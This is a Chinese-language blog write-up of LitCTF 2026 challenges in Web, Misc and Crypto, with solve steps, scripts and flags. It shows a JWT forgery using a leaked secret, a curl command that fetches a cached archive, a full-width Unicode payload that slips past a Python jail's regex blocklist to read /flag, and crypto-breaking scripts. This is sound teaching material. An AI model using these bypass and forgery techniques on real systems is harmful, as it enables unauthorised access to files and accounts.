---
title: "LitCTF 2026 · 部分题解"
description: "汇总 LitCTF 2026 的 Web、Misc、Crypto 部分题解，按题型分段整理。"
date: "2026-05-23"
updated: "2026-05-23"
categories: ["Practice"]
tags: ["LitCTF", "Web", "Misc", "Crypto", "Writeup"]
type: tech
permalink: "/litctf2026-partial-wp"
---
## LitCTF2026_WEB_WP

# [LitCTF2026] Web WP

本文整理 LitCTF2026 的两道 Web 题，重点保留利用链、关键泄露点和可复现步骤，方便直接发布到博客。

---

## 1. Northbridge Document Hub

### 题目信息

- 分类：Web
- 题面摘要：文档中心接入了 kkFileView 兼容预览网关，研究员账号已开放，目标是从解析缓存里拿到财务归档中的 flag。

### 核心思路

这是一个典型的“先拿普通账号，再读缓存文件”的题。反编译 `northbridge_ROOT.war` 后，可以直接看到两条关键信息：

- 登录凭据是硬编码的：`researcher / Research#2026`
- 文件下载接口是 `/kkfileview/getCorsFile`，参数名为 `urlPath`

`urlPath` 先做 Base64 解码，再交给路径解析器；如果解码后的路径不是缓存绝对路径，就会被拼到 `/opt/kkfileview/cache/parsed` 下面。

### 利用步骤

#### Step 1: 登录后台

前端 `portal.js` 和后端 `LoginServlet` 都泄露了账号密码：

```text
researcher:Research#2026
```

#### Step 2: 定位目标文件

Dashboard 里能看到审计日志：

```text
doc/finance_2026q1.xlsx parse SUCCESS
```

结合“本季度财务归档”的题意，目标文件名就是：

```text
q1_finance_report_2026.zip
```

把它做 Base64：

```text
cTFfZmluYW5jZV9yZXBvcnRfMjAyNi56aXA=
```

#### Step 3: 读取缓存文件

```bash
curl -b cookies.txt -o q1_finance_report_2026.zip \
  "http://challenge.cyclens.tech:30720/kkfileview/getCorsFile?urlPath=cTFfZmluYW5jZV9yZXBvcnRfMjAyNi56aXA="
```

解压后读取 `flag.txt` 即可。

### Flag

```text
flag{44xcdrkv-wklf-4wj-8avx-axgvh0zjzvzc4}
```

### 关键点

- 前端 JS 直接泄露凭据和接口名
- 目标不在目录穿越，而在缓存目录拼接逻辑
- 只要猜对文件名，就能直接下载归档

---

## 2. lit_reverse_my_web

### 题目信息

- 分类：Web / Reverse
- 题面摘要：需要逆出服务端逻辑，再伪造管理员身份拿 `/flag`。

### 核心思路

这题的重点不是爆破 Web，而是逆服务端二进制。工作区里已经保留了现成利用脚本：

```text
lit_reverse_my_web/solve.py
```

脚本已经提取出 JWT 的 HS256 密钥：

```text
rMw_2026_litctf_jwt_secret_key!!
```

利用方式很直接：

1. 伪造 `role=admin` 的 token
2. 带 `Authorization: Bearer <token>` 请求 `/flag`

### 现成脚本

```bash
python lit_reverse_my_web/solve.py http://challenge.cyclens.tech:30273
```

### 关键字段

```json
{
  "role": "admin",
  "iss": "reverseMyWeb",
  "sub": "alice"
}
```

### 本地证据

- 题包：`lit_reverse_my_web/challenge.zip`
- 本地服务：`lit_reverse_my_web/src/server.exe`
- 利用脚本：`lit_reverse_my_web/solve.py`

---

## LitCTF2026_MISC_WP

# [LitCTF2026] Misc WP

本文整理 LitCTF2026 已完成的几道 `Misc` 题，保留题目思路、关键操作和最终结果，方便直接发布。

---

## 1. lit_lsb_base64

### 题目类型

- 图片隐写
- LSB
- Base64

### 解题思路

题包中只有一张 `stego.png`。先做基础排查后可以发现这张图非常像“整图作为载体”的 LSB 隐写题，于是直接提取各颜色通道的最低位。

实际测试后，红通道最低位按顺序取出、每 8 位拼成一个字节，就能在前面少量填充数据之后看到明显的 Base64：

```text
TGl0Q1RGe2xzYl8xc19mdW5fdzF0aF9iNHMzXzY0fQ==
```

解码后得到：

```text
LitCTF{lsb_1s_fun_w1th_b4s3_64}
```

### 关键点

- 不要只盯着 `strings`
- 直接检查 RGB 三个通道的 LSB
- 提出来的字节流里如果出现长串可打印字符，优先怀疑 Base64

### Flag

```text
LitCTF{lsb_1s_fun_w1th_b4s3_64}
```

---

## 2. lit_rush_qr

### 题目类型

- GIF
- QR
- 图像恢复

### 解题思路

附件只有一个 `rush.gif`，题面说“闪得很快”，并提示有人瞥见了二维码一角。先拆帧检查，发现一共 5 帧：

- 第 0、1、3 帧是普通提示文字
- 第 2、4 帧是同一张黑白二维码图

也就是说，真正有用的不是“把多帧叠加”，而是中间那张二维码本身。

把二维码主体裁出来后可以看出：这是一张故意损坏的二维码，缺少了两个定位角。由于二维码本身纠错等级较高，可以尝试将标准 finder pattern 手工补回，再交给解码器识别。

将图像量化到模块网格后，补回左上、右上、左下三个标准定位框及分隔白边，最终成功解码：

```text
LitCTF{qr_h1gh_3rr_c0r_r3c0v3ry}
```

### 关键点

- “闪得快”是误导，先拆帧再说
- 第 2/4 帧完全相同，说明不需要复杂时序恢复
- 二维码如果缺角，先考虑手工补标准定位图案

### Flag

```text
LitCTF{qr_h1gh_3rr_c0r_r3c0v3ry}
```

---

## 3. lit_sstv

### 题目类型

- 音频隐写
- SSTV

### 解题思路

题目给出的是一段 `signal.wav`，听起来像调制解调器或短波噪声，典型 SSTV 风格。

先看音频参数：

- 单声道
- `44.1 kHz`
- 时长约 `115.2s`

这个时长和 `Martin M1` 一整张图的发射时长高度吻合，因此优先按 `Martin M1` 解码。

后续流程：

1. 对音频做解析，估计瞬时频率
2. 按 `Martin M1` 的行结构切分：
   - sync
   - porch
   - G
   - B
   - R
3. 初步重建整张图
4. 再根据逐行同步脉冲做校正，修正行漂移

最终图中清楚显示：

```text
LitCTF{sstv_p4t13nc3}
```

### 关键点

- `115.2s` 基本是很强的 `Martin M1` 特征
- 第一版图像哪怕有漂移，往往也足够暴露文字轮廓
- 逐行跟踪同步头可以明显提升最终可读性

### Flag

```text
LitCTF{sstv_p4t13nc3}
```

---

## 4. lit_welcome

### 题目类型

- 图片隐写
- 颜色通道差分

### 解题思路

题目说组委会发来一张“欢迎”图片，但肉眼看上去几乎是纯白。

查看 `welcome.png` 的像素统计后可以发现：

- 绿色通道恒为 `255`
- 蓝色通道恒为 `255`
- 红色通道只有 `254` 和 `255` 两种值

这说明图里的内容不是不存在，而是被藏在“几乎纯白”的红通道里。把所有 `R=254` 的像素提取出来后，隐藏文字立刻显现，其中第二行直接给出 flag：

```text
LitCTF{w3lc0m3_t0_m1sc_w0rld}
```

### 关键点

- 白图不等于空图
- 先做通道统计，再做阈值分离
- 只差 `1` 的颜色值也足够藏信息

### Flag

```text
LitCTF{w3lc0m3_t0_m1sc_w0rld}
```

---

## 5. lit_pyjail_unicode

### 题目类型

- Pyjail
- Unicode 标识符绕过

### 解题思路

源码核心逻辑如下：

- 服务端收一行 Python
- 用正则黑名单检查原始源码文本
- 如果通过，就执行：

```python
eval(line, {"__builtins__": __builtins__})
```

过滤规则只检查用户输入的原始字符串，比如：

- `open`
- `eval`
- `import`
- `__`

但是 Python 在解析标识符时会做 Unicode 归一化，因此全角字符会被视为等价 ASCII 标识符。

例如：

```python
ｏｐｅｎ('/flag').read()
```

对正则来说，这不是 ASCII 的 `open`；但对 Python 解释器来说，它会被归一化并当成普通 `open` 执行。

直接发送上面的 payload 即可读出 flag。

### Payload

```python
ｏｐｅｎ('/flag').read()
```

### Flag

```text
flag{lq9cghe6-8cco-4qk-8cti-h5esrd1xlvslu}
```

---

## 6. lit_pyjail_reader

### 题目类型

- Reader jail
- 交互式两步读文件

### 解题思路

这题根本不需要 RCE，题目源码已经把流程写得很清楚：

1. 先通过一个简单验证码
2. 第一次读取 `/app/where_is_flag.txt`
3. 第二次读取上一步返回的真实 flag 路径

验证码是一个大写字符串，要求输入其逆序。通过后第一次读取：

```text
/app/where_is_flag.txt
```

服务端返回的内容是：

```text
/flag
```

然后第二次再读取：

```text
/flag
```

即可得到 flag。

### 关键点

- 这是“按提示读文件”的入门题，不要过度做成 RCE
- 验证码就是简单字符串反转
- 按题目要求分两步读取即可

### Flag

```text
flag{zpr4vjsv-iotj-4af-8dwg-kddegvu6viz09}
```

---

## 总结

这几道 `Misc` 的整体风格偏入门和识别型，覆盖了几个很典型的方向：

- 图片 LSB 隐写
- 近白色通道藏字
- 二维码修复
- SSTV 音频转图像
- Unicode Pyjail 绕过
- 按提示读取文件的 reader jail

如果后续继续整理，可以把每题对应的脚本单独放到附件中，形成“WP + solve script”的完整交付版本。

---

## LitCTF2026_crypto_WP

# [LitCTF2026] Crypto WP

## 1. lit_xor_two_story — OTP Key Reuse

**考点：** 流密码密钥复用攻击

**题目描述：** 同一串随机密钥流 k 加密了两条 40 字节明文，第二条明文已知。

**已知数据：**

- `c1 = m1 XOR k`
- `c2 = m2 XOR k`
- `m2 = b"litctf2026_xor_keystream_reuse_40bytes!!"`（已知）

**解法：** XOR 两条密文消去密钥流，再与已知明文异或恢复 flag。

```
c1 XOR c2 = (m1 XOR k) XOR (m2 XOR k) = m1 XOR m2
m1 = (c1 XOR c2) XOR m2
```

```python
c1 = bytes.fromhex('5f70a847ce12759e156e3cad1aa9530a119386a02ffc1c31bf14ab7a0a82ccc108f8476f75c98a28')
c2 = bytes.fromhex('5f70a847ce123cc153283ca710ae7f042b8490a238eb2228970fad6a2694f2985dc5557e69e5f474')
m2 = b'litctf2026_xor_keystream_reuse_40bytes!!'
m1 = bytes(a ^ b ^ c for a, b, c in zip(c1, c2, m2))
# litctf{otp_reuse_never_twice_same_key__}
```

**教训：** OTP 每条密钥必须只使用一次。密钥流复用将两条密文的安全性降级为零——不需要密钥即可恢复双方明文。

---

## 2. lit_elgamal_handshake — ElGamal 私钥泄露

**考点：** ElGamal 加密 / 调试信息泄露

**题目描述：** 服务端 debug 日志意外打印了 ElGamal 私钥 x。

**已知数据：** 公钥 (p, g, y)、密文 (c1, c2)、私钥 x。

**解法：** 正常 ElGamal 解密流程——已知私钥 x，直接计算共享秘密即可。

```
s = c1^x mod p       # 共享秘密
m = c2 * s^(-1) mod p # 恢复明文
```

```python
from Crypto.Util.number import long_to_bytes

s = pow(c1, x, p)
s_inv = pow(s, -1, p)
m = (c2 * s_inv) % p
flag = long_to_bytes(m)
# litctf{elgamal_leak_makes_happy_decrypt}
```

**教训：** 私钥泄露 = 加密完全失效。生产环境绝不能将私钥、共享秘密等敏感数据写入日志。

---

## 3. lit_rsa_neighbor — RSA Fermat 分解

**考点：** Fermat 分解 / 临近素数漏洞

**题目描述：** 随机生成素数 p，连续调用 `next_prime()` 若干次得到 q。p 和 q 间距极小。

**已知数据：** n, c, e = 65537。

**解法：** Fermat 分解适用于 |p - q| 较小的情况。

```
设 a = (p+q)/2, b = (p-q)/2
则 a^2 - n = b^2

从 a = ceil(sqrt(n)) 开始，检查 a^2 - n 是否为完全平方数。
一旦找到 b = sqrt(a^2 - n)，则 p = a-b, q = a+b。
```

```python
import math

a = math.isqrt(n) + 1
while True:
    b2 = a * a - n
    b = math.isqrt(b2)
    if b * b == b2:
        p = a - b
        q = a + b
        break
    a += 1

phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
# litctf{rsa_fermat_finds_close_primes}
```

第一轮迭代即命中，说明 p 和 q 极度接近。

**教训：** RSA 密钥生成必须确保 p 和 q 充分随机、相互独立，间距足够大才能抵抗 Fermat 分解。

---

## 4. lit_tiny_key_aes — AES 密钥空间过小

**考点：** 密钥空间枚举 / AES-ECB

**题目描述：** AES-128-ECB 密钥前 13 字节固定为 `LitCTF2026!!!`，仅末尾 3 字节随机。

**已知数据：** 密文 (48 字节)、密钥前缀 `LitCTF2026!!!`。

**解法：** 未知密钥空间仅 2^24 ≈ 1677 万，可暴力枚举。

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

KEY_PREFIX = b"LitCTF2026!!!"

for b0 in range(256):
    for b1 in range(256):
        for b2 in range(256):
            key = KEY_PREFIX + bytes([b0, b1, b2])
            try:
                cipher = AES.new(key, AES.MODE_ECB)
                plain = unpad(cipher.decrypt(c), AES.block_size)
                if plain.startswith(b'litctf{'):
                    print(plain.decode())  # litctf{aes_tiny_brut3_for_the_win!}
            except ValueError:
                pass  # padding 不合法，跳过
```

pycryptodome C 扩展实现，1677 万次解密约十余秒完成。后缀为 `37a201`。

**教训：** AES-128 密钥必须全随机生成。部分固定的密钥相当于降级为超短密钥，彻底失去抗暴力破解能力。

---

## 总结

| 题目 | 漏洞类型 | 核心教训 |
|------|---------|---------|
| lit_xor_two_story | OTP 密钥复用 | 流密码密钥绝不重复使用 |
| lit_elgamal_handshake | 私钥泄露 | 敏感材料不入日志 |
| lit_rsa_neighbor | 临近素数 | p、q 必须独立随机且间距足够大 |
| lit_tiny_key_aes | 密钥空间过小 | 密钥必须全随机生成 |
